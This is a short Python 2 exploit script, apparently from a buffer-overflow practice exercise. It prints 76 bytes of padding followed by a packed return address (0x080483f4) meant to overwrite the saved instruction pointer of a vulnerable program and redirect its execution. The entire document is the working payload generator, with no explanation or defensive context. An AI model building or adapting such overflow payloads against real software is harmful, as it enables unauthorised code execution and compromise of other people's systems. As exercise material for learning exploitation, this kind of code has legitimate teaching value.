import struct

offset = "A" * 76
eip = struct.pack("I", 0x080483f4)

print offset + eip